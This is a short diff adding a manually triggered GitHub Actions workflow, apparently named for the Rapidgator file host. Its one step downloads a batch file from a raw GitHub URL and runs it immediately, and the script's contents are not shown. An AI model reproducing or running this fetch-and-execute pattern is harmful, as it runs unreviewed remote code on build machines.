@@ -1,0 +1,16 @@
+name: Windows - Rapidgator2
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+  
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yuixine/log/master/dep_download/runrpg2.bat" -OutFile "runrpg2.bat"
+          cmd /c runrpg2.bat
